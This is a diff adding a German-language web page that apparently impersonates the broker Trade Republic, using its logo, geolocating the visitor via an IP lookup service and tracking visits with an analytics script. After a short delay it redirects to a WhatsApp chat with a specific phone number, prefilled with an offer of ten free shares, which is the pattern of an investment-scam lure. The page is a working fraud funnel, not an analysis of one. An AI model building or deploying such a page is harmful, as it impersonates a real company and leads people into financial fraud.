@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <title>Trade Republic – Weiterleitung</title>
+
+  
+  <script defer src="https://cdn.counter.dev/script.js"
+    data-id="gugu888-jan.github.io"
+    data-utcoffset="+2">
+  </script>
+
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #ffffff;
+      text-align: center;
+      padding: 60px 20px;
+      color: #222;
+    }
+    #logo {
+      width: 160px;
+      margin-bottom: 30px;
+    }
+    #message {
+      font-size: 28px;
+      font-weight: bold;
+      margin: 20px 0 10px;
+    }
+    #country {
+      font-size: 20px;
+      color: #555;
+    }
+  </style>
+
+  <script>
+    async function checkAndRedirect() {
+      const message = document.getElementById("message");
+      const countryText = document.getElementById("country");
+
+      try {
+        const res = await fetch("https://ipwho.is");
+        const data = await res.json();
+
+        const country = data.country_code;
+        const countryName = data.country;
+
+        countryText.textContent = "🌍 Standort erkannt: " + countryName + " (" + country + ")";
+        message.textContent = "✅ Weiterleitung erfolgt...";
+
+        setTimeout(() => {
+          window.location.href = "https://api.whatsapp.com/send/?phone=4917635220381&text=Erhalten+Sie+10+potenzielle+Aktien+kostenlos&type=phone_number&app_absent=0"; // 
+        }, 1500);
+
+      } catch (e) {
+        message.textContent = "⚠️ Fehler bei der Standorterkennung.";
+        countryText.textContent = "Bitte versuche es später erneut.";
+        console.error(e);
+      }
+    }
+
+    window.onload = checkAndRedirect;
+  </script>
+</head>
+<body>
+  <img id="logo" src="https://upload.wikimedia.org/wikipedia/commons/4/4a/Trade_Republic_Logo.svg" alt="Trade Republic Logo">
+  <h2 id="message">📡 Weiterleitung wird vorbereitet...</h2>
+  <p id="country">Bitte einen Moment Geduld.</p>
+</body>
+</html>
